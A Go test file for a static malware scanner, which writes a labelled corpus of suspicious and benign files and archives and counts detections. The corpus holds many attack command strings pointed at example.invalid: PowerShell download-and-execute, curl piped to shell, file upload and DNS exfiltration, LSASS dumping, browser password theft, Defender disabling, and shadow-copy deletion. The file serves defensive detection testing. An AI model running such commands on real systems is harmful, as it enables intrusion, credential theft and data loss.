package main

// Stage 6: TEST ONLY. All payloads are inert strings or inert archives.
// No malicious instructions are executed and no network addresses are contacted.
// Labels denote simulated suspicious INDICATORS, not confirmed malware.
// Findings are advisory; all misses and false alarms are reported without
// causing the exploratory matrix itself to fail.

import (
 "archive/zip"
 "bytes"
 "fmt"
 "os"
 "path/filepath"
 "sort"
 "strings"
 "testing"
)

type stage6Case struct {
 group, label, filename, content string
 suspicious bool
}
func stage6Corpus() []stage6Case {
 var cases []stage6Case
 add:=func(group string,suspicious bool,rows ...[3]string){
  for _,r:=range rows {cases=append(cases,stage6Case{group,r[0],r[1],r[2],suspicious})}
 }
 add("delivery/disguise",true,
  [3]string{"Double extension executable","invoice.pdf.exe","inert"},
  [3]string{"Double extension script","family.jpg.js","// inert"},
  [3]string{"Misleading Unicode controls","statement\u202eexe.txt","inert"},
  [3]string{"PE image disguise","portrait.png",string(fixturePE())},
  [3]string{"Misnamed system process","svchost.exe",strings.Repeat("binary-not-active",50)},
  [3]string{"Suspicious shortcut encoded command","shortcut.lnk","powershell -enc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"},
  [3]string{"Script in startup naming","startup.ps1","Write-Host hello"},
  [3]string{"Malware-like invoice text only","invoice.txt","Open the invoice and pay an urgent fee"},
  [3]string{"HTML phishing form text","login.html","<form action='https://example.invalid'>password</form>"},
  [3]string{"Unicode homograph domain text","link.txt","Please visit paypa\u043b.example.invalid"},
  [3]string{"Macro office warning text","statement.docm","inert document content"},
  [3]string{"Fake DLL content","comhost.dll","not executable: inert"})
 add("script execution",true,
  [3]string{"PowerShell download execute","a.ps1","IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/no')"},
  [3]string{"PowerShell Invoke-RestMethod and IEX","b.ps1","Invoke-RestMethod https://example.invalid/x | IEX"},
  [3]string{"PowerShell encoded","c.cmd","powershell -EncodedCommand AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"},
  [3]string{"PowerShell Base64 execute","d.ps1","IEX ([Convert]::FromBase64String('AAAA'))"},
  [3]string{"Curl pipe PowerShell","e.cmd","curl https://example.invalid/test | powershell.exe"},
  [3]string{"Remote mshta","f.cmd","mshta https://example.invalid/sample"},
  [3]string{"JavaScript eval fetch","g.js","eval(await fetch('https://example.invalid/x').then(x=>x.text()))"},
  [3]string{"WScript script download","h.vbs","Set x = CreateObject(\"MSXML2.XMLHTTP\"): x.Open \"GET\", \"http://example.invalid/x\""},
  [3]string{"Regsvr32 remote scrobj","i.cmd","regsvr32.exe /s /n /u /i:https://example.invalid/sct scrobj.dll"},
  [3]string{"Rundll32 JavaScript execution","j.cmd","rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\""},
  [3]string{"Msiexec remote installation","k.cmd","msiexec.exe /i https://example.invalid/p.msi /qn"},
  [3]string{"Bitsadmin remote job","l.cmd","bitsadmin /transfer x https://example.invalid/x C:\\temp\\x"},
  [3]string{"PowerShell simple obfuscation","m.ps1","$x='In'+'voke-Expression'; & $x 'Write-Output hi'"},
  [3]string{"Unicode encoded script","n.ps1","`IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/x')`"})
 add("persistence/lateral",true,
  [3]string{"Scheduled task PowerShell","a.cmd","schtasks /create /tn Demo /tr powershell.exe"},
  [3]string{"Run key via reg add","b.cmd",`reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Demo /t REG_SZ /d "notexecuted.exe"`},
  [3]string{"Run key via WScript","c.vbs",`WScript.Shell RegWrite \CurrentVersion\Run`},
  [3]string{"Defender exclusion","d.ps1","Add-MpPreference -ExclusionPath C:\\example"},
  [3]string{"Defender realtime disabled","e.ps1","Set-MpPreference -DisableRealtimeMonitoring $true"},
  [3]string{"Service creation","f.cmd","sc create fake binPath= C:\\example.exe"},
  [3]string{"WMI subscription syntax","g.ps1","Register-WmiEvent -Query 'SELECT * FROM __InstanceCreationEvent'"},
  [3]string{"Remote WMI process","h.cmd","wmic /node:example.invalid process call create not-real.exe"},
  [3]string{"PsExec command text","i.cmd","psexec \\\\example.invalid cmd"},
  [3]string{"RDP enable registry","j.cmd",`reg add HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server /v fDenyTSConnections /d 0`})
 add("ransomware-like",true,
  [3]string{"Shadow copy deletion","a.cmd","vssadmin delete shadows /all /quiet"},
  [3]string{"Recovery disruption","b.cmd","bcdedit /set {default} recoveryenabled no"},
  [3]string{"Backup deletion","c.cmd","wbadmin delete catalog -quiet"},
  [3]string{"Ransom note text","README_DECRYPT.txt","Your files have been encrypted. Pay to recover them."},
  [3]string{"Extension string .locked","locked.txt","All files now end in .locked"},
  [3]string{"Repeated file rename shell","d.ps1","Get-ChildItem *.docx | Rename-Item -NewName { $_.Name + '.locked' }"},
  [3]string{"Crypto library source only","encrypt.js","crypto.subtle.encrypt({name:'AES-GCM'},key,data)"})
 add("credential/exfiltration",true,
  [3]string{"Browser password path text","a.ps1","Copy-Item $env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"},
  [3]string{"LSASS dump command text","b.cmd","procdump -ma lsass.exe dump.dmp"},
  [3]string{"DPAPI credential text","c.ps1","[Security.Cryptography.ProtectedData]::Unprotect($data)"},
  [3]string{"HTTP POST send file","d.ps1","Invoke-RestMethod -Method POST -InFile passwords.txt -Uri https://example.invalid"},
  [3]string{"Curl upload file","e.cmd","curl -F file=@sample.txt https://example.invalid"},
  [3]string{"DNS exfil-like loop","f.ps1","nslookup $chunk.example.invalid"},
  [3]string{"Discord webhook URL text","webhook.txt","https://discord.com/api/webhooks/000/placeholder"},
  [3]string{"Clipboard read","g.ps1","Get-Clipboard | Out-File clip.txt"},
  [3]string{"Screenshot capture call","h.ps1","CopyFromScreen(0,0,0,0,$size)"},
  [3]string{"Keylogging API name text","i.js","GetAsyncKeyState"})
 add("uncommon techniques",true,
  [3]string{"AMSI bypass reference","a.ps1","AmsiUtils amsiInitFailed = true"},
  [3]string{"Reflective load reference","b.ps1","[Reflection.Assembly]::Load($bytes)"},
  [3]string{"In-memory PE header text","c.ps1","VirtualAlloc WriteProcessMemory CreateRemoteThread"},
  [3]string{"Process hollowing reference","d.ps1","NtUnmapViewOfSection ResumeThread"},
  [3]string{"Malicious-looking .7z text","suspicious.7z","IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/x')"},
  [3]string{"Fake compressed .rar text","opaque.rar","IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/x')"},
  [3]string{"Steganography note","secret.jpg","ordinary pixels could contain a hidden message"},
  [3]string{"ISO fake content","disk.iso","suspicious disk image not interpreted"},
  [3]string{"Kernel driver reference","driver.sys","kernel driver with malicious behavior"},
  [3]string{"Linux bash curl pipeline","install.sh","curl https://example.invalid | sh"},
  [3]string{"Python remote exec","remote.py","exec(__import__('urllib.request').request.urlopen('https://example.invalid').read())"},
  [3]string{"PowerShell command inside harmless comment","comment.ps1","# IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/x')"})
 add("benign lookalikes",false,
  [3]string{"Normal PowerShell","normal.ps1","Write-Output hello"},
  [3]string{"Normal batch","normal.cmd","echo hello"},
  [3]string{"Document quoting PowerShell","notes.txt","Documentation: IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/x')"},
  [3]string{"PS block-comment only","comment.ps1","<#\nIEX (New-Object Net.WebClient).DownloadString('https://example.invalid/x')\n#>\nWrite-Host hi"},
  [3]string{"JS comment only","comment.js","/* eval(await fetch('https://example.invalid').then(r=>r.text())) */\nconsole.log('hi')"},
  [3]string{"Script with download only","download.ps1","Invoke-WebRequest https://example.invalid/x -OutFile data.txt"},
  [3]string{"Script with IEX only","expression.ps1","Invoke-Expression 'Write-Output 1'"},
  [3]string{"System filename as inert text","svchost.exe","simple data not a PE"},
  [3]string{"Office macro legitimate","invoice.docm","simple document placeholder"},
  [3]string{"Plain ZIP contents","normal.zip","normal archive placeholder"},
  [3]string{"Normal shortcut-like file","shortcut.lnk","ordinary inert shortcut data"},
  [3]string{"Encoded command in documentation","example.cmd","echo powershell -enc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"},
  [3]string{"Text named encrypted","data.locked","This is a normal manually named file"},
  [3]string{"Benign encryption doc","cipher.txt","AES-GCM is a common encryption mechanism"},
  [3]string{"Official management command text","admin.txt","vssadmin delete shadows /all /quiet"},
  [3]string{"Plain image","image.jpg","JPG placeholder without PE header"},
  [3]string{"Normal executables","tool.exe","inert binary placeholder"},
  [3]string{"Unusual name","very_odd_name.dll","not a real DLL"},
  [3]string{"Normal web HTML","index.html","<html><body>Welcome</body></html>"},
  [3]string{"GitHub workflow text","workflow.yml","steps:\n  - run: echo hi"},
  [3]string{"PowerShell export certificate","cert.ps1","Export-Certificate -Cert $cert -FilePath test.cer"},
  [3]string{"SHA256 hash command","hash.cmd","certutil -hashfile example.bin SHA256"},
  [3]string{"Plain text backup instructions","backup.txt","Back up important data regularly"},
  [3]string{"Normal user JS fetch","api.js","fetch('/api/status').then(r=>r.json())"},
  [3]string{"Normal installer MSI","setup.msi","not executable MSI fixture"},
  [3]string{"Normal scheduled task doc","schedule.txt","Use schtasks /create in IT administration"},
  [3]string{"Benign base64 decode","base64.ps1","[Convert]::FromBase64String('AAAA')"},
  [3]string{"Normal VBS","greet.vbs","MsgBox \"Hello\""},
  [3]string{"Normal Python","clean.py","print('hello')"},
  [3]string{"Normal shell","clean.sh","echo hello"})
 return cases
}

func TestStage6BroadThreatMatrix(t *testing.T) {
 cases:=stage6Corpus()
 t.Logf("STAGE6 MATRIX SIZE %d",len(cases))
 base:=t.TempDir()
 type counts struct{tp,fn,fp,tn int}
 results:=map[string]*counts{}
 totals:=counts{}
 for i,c:=range cases {
  p:=filepath.Join(base,fmt.Sprintf("case-%04d",i),c.filename)
  if err:=os.MkdirAll(filepath.Dir(p),0700);err!=nil{t.Fatal(err)}
  if err:=os.WriteFile(p,[]byte(c.content),0600);err!=nil{t.Fatal(err)}
  st,err:=os.Stat(p);if err!=nil{t.Fatal(err)}
  f:=inspectFile(p,st)
  flag:=f!=nil
  r:=results[c.group]
  if r==nil{r=&counts{};results[c.group]=r}
  switch{
  case c.suspicious&&flag:r.tp++;totals.tp++
  case c.suspicious&&!flag:r.fn++;totals.fn++;t.Logf("MISSED group=%s case=%s",c.group,c.label)
  case !c.suspicious&&flag:r.fp++;totals.fp++;t.Logf("FALSE_FLAG group=%s case=%s score=%d reasons=%v",c.group,c.label,f.Score,f.Reasons)
  default:r.tn++;totals.tn++
  }
 }
 groups:=make([]string,0,len(results))
 for g:=range results{groups=append(groups,g)}
 sort.Strings(groups)
 for _,g:=range groups {
  x:=results[g]
  t.Logf("STAGE6_GROUP name=%q tp=%d fn=%d fp=%d tn=%d",g,x.tp,x.fn,x.fp,x.tn)
 }
 t.Logf("STAGE6_TOTAL tp=%d fn=%d fp=%d tn=%d suspicious=%d benign=%d",totals.tp,totals.fn,totals.fp,totals.tn,totals.tp+totals.fn,totals.fp+totals.tn)
 if totals.tp+totals.fn+totals.fp+totals.tn!=len(cases){t.Fatal("matrix not fully evaluated")}
}

func TestStage6ArchiveAndContainerMatrix(t *testing.T){
 cases:=[]struct{label,ext string;entries map[string]string;expected bool}{
  {"ordinary ZIP",".zip",map[string]string{"readme.txt":"nothing suspicious"},false},
  {"ZIP double extension",".zip",map[string]string{"picture.jpg.exe":"inert"},true},
  {"ZIP dangerous script",".zip",map[string]string{"run.ps1":"IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/x')"},true},
  {"JAR double extension",".jar",map[string]string{"invoice.pdf.exe":"inert"},true},
  {"DOCX with script entry",".docx",map[string]string{"scripts/run.ps1":"IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/x')"},true},
  {"PPTX script entry",".pptx",map[string]string{"scripts/run.ps1":"IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/x')"},true},
  {"XLSM misleading executable",".xlsm",map[string]string{"doc.jpg.exe":"inert"},true},
  {"ZIP script only normal",".zip",map[string]string{"normal.ps1":"Write-Output hello"},false},
  {"ZIP with benign suspicious quote",".zip",map[string]string{"normal.ps1":"Write-Host \"IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/x')\""},false},
  {"ZIP with markdown threat doc",".zip",map[string]string{"guide.txt":"Documentation: Add-MpPreference -ExclusionPath"},false},
 }
 base:=t.TempDir()
 tp,fn,fp,tn:=0,0,0,0
 for i,c:=range cases{
  var b bytes.Buffer
  zw:=zip.NewWriter(&b)
  names:=make([]string,0,len(c.entries));for name:=range c.entries{names=append(names,name)};sort.Strings(names)
  for _,n:=range names{w,e:=zw.Create(n);if e!=nil{t.Fatal(e)};if _,e=w.Write([]byte(c.entries[n]));e!=nil{t.Fatal(e)}}
  if e:=zw.Close();e!=nil{t.Fatal(e)}
  p:=filepath.Join(base,fmt.Sprintf("%03d",i)+c.ext)
  if e:=os.WriteFile(p,b.Bytes(),0600);e!=nil{t.Fatal(e)}
  st,_:=os.Stat(p)
  f:=inspectFile(p,st)
  if c.expected&&f!=nil{tp++}else if c.expected{fn++;t.Logf("ARCHIVE_MISS %s",c.label)}else if f!=nil{fp++;t.Logf("ARCHIVE_FALSE_FLAG %s %v",c.label,f.Reasons)}else{tn++}
 }
 t.Logf("STAGE6_ARCHIVES tp=%d fn=%d fp=%d tn=%d",tp,fn,fp,tn)
}

func TestStage6BaselineSafetyNoModification(t *testing.T){
 d:=t.TempDir()
 p:=filepath.Join(d,"invoice.pdf.exe")
 original:=[]byte("inert unexecuted file data")
 if err:=os.WriteFile(p,original,0600);err!=nil{t.Fatal(err)}
 st,_:=os.Stat(p)
 _=inspectFile(p,st)
 after,err:=os.ReadFile(p)
 if err!=nil||!bytes.Equal(after,original){t.Fatal("scanner changed inspected file")}
 t.Log("STAGE6_PASS: static inspection did not modify input file")
}
